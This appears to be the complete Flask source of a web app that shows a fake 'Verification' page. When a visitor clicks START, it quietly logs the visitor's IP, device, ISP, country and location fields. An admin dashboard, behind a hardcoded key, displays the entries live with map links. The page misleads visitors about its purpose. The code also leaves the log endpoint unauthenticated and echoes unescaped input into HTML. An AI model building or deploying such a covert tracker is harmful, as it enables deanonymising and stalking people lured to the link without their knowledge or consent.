from flask import Flask, request, jsonify
import os, re, requests
from datetime import datetime

app = Flask(__name__)

ADMIN_KEY = "0949205717As"

MOBILE_RE = re.compile(r"Android|iPhone|iPad|iPod|Mobile", re.I)

# ---------------- DEVICE ----------------
def detect_device(ua):
    if not ua:
        return "unknown"
    return "mobile" if MOBILE_RE.search(ua) else "desktop"

# ---------------- IP CHECK ----------------
def check_ip(ip):
    proxy = False
    isp = "Unknown"
    country = "Unknown"
    risk = 0

    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=66846719",
            timeout=4
        ).json()

        isp = r.get("isp", "Unknown")
        country = r.get("country", "Unknown")

        org = (r.get("org") or "").lower()
        reverse = (r.get("reverse") or "").lower()

        keywords = ["vpn", "proxy", "hosting", "server", "datacenter"]

        if any(k in org for k in keywords):
            proxy = True
            risk += 40

        if any(k in reverse for k in keywords):
            proxy = True
            risk += 30

        if "mobile" in isp.lower():
            risk -= 10

    except:
        pass

    return proxy, isp, country, max(0, min(100, risk))

# ---------------- SCORE ----------------
def reliability_score(acc, percent, proxy, device, vpn_risk):

    score = 100

    if acc <= 20: score -= 5
    elif acc <= 50: score -= 10
    elif acc <= 100: score -= 20
    elif acc <= 200: score -= 35
    elif acc <= 500: score -= 55
    else: score -= 70

    score += percent * 0.25

    if device == "mobile":
        score += 3
    else:
        score -= 2

    if proxy:
        score -= 35

    score -= vpn_risk * 0.4

    return max(0, min(100, int(score)))

# ---------------- HOME ----------------
@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure System</title>
<style>
body{background:#0f0f1f;color:white;text-align:center;font-family:Arial}
.card{margin-top:120px;background:#111;padding:40px;display:inline-block;border-radius:15px}
button{padding:15px 30px;background:#6c5ce7;color:white;border:none;border-radius:10px;font-size:18px}
</style>
</head>
<body>

<div class="card">
<h2>🔐 Verification</h2>
<p>Click to continue</p>
<button onclick="send()">START</button>
<p id="st"></p>
</div>

<script>
function send(){
  document.getElementById("st").innerText="loading...";

  fetch("/location", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      lat:null,
      lon:null,
      acc:9999,
      percent:0
    })
  }).then(()=>{
    document.getElementById("st").innerText="done";
    setTimeout(()=>location="/done",800);
  });
}
</script>

</body>
</html>
"""

# ---------------- DONE ----------------
@app.route("/done")
def done():
    return "<h1 style='text-align:center;background:black;color:white;padding:100px'>DONE</h1>"

# ---------------- LOCATION ----------------
@app.route("/location", methods=["POST"])
def location():

    data = request.get_json() or {}

    lat = data.get("lat")
    lon = data.get("lon")
    acc = float(data.get("acc", 9999))
    percent = int(data.get("percent", 0))

    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    device = detect_device(ua)

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    proxy, isp, country, vpn_risk = check_ip(ip)

    score = reliability_score(acc, percent, proxy, device, vpn_risk)

    with open("log.txt", "a") as f:
        f.write(f"{now}|{ip}|{device}|{country}|{isp}|{lat}|{lon}|{acc}|{percent}|{proxy}|{score}\n")

    return jsonify({"ok": True})

# ---------------- LOGS (AUTO REFRESH UI) ----------------
@app.route("/logs")
def logs():

    rows = ""

    try:
        with open("log.txt") as f:
            for line in f:
                t,ip,device,country,isp,lat,lon,acc,percent,proxy,score = line.strip().split("|")

                color = "lime" if int(percent) > 80 else "orange" if int(percent) > 50 else "red"

                rows += f"""
<tr>
<td>{t}</td>
<td>{ip}</td>
<td>{device}</td>
<td>{country}</td>
<td>{isp}</td>
<td>{lat},{lon}</td>
<td>{acc}</td>
<td style="color:{color}">{percent}%</td>
<td>{proxy}</td>
<td>{score}</td>
<td><a href="https://www.google.com/maps?q={lat},{lon}" target="_blank">📍</a></td>
</tr>
"""

    except:
        rows = "<tr><td colspan=11>No data</td></tr>"

    return rows

# ---------------- ADMIN ----------------
@app.route("/admin")
def admin():

    if request.args.get("key") != ADMIN_KEY:
        return "Access Denied"

    return f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dashboard</title>

<style>
body{{background:#0b0b1a;color:white;font-family:Arial}}
table{{width:100%;text-align:center}}
th,td{{padding:8px}}
</style>
</head>
<body>

<h1>📊 LIVE DASHBOARD</h1>

<table border="1">
<tr>
<th>Time</th><th>IP</th><th>Device</th><th>Country</th><th>ISP</th>
<th>Location</th><th>Accuracy</th><th>%</th><th>Proxy</th><th>Score</th><th>Map</th>
</tr>

<tbody id="tbl"></tbody>
</table>

<script>
function load(){
  fetch("/logs")
    .then(r=>r.text())
    .then(d=>{
      document.getElementById("tbl").innerHTML = d;
    });
}

setInterval(load, 2000);
load();
</script>

</body>
</html>
"""

# ---------------- RUN ----------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
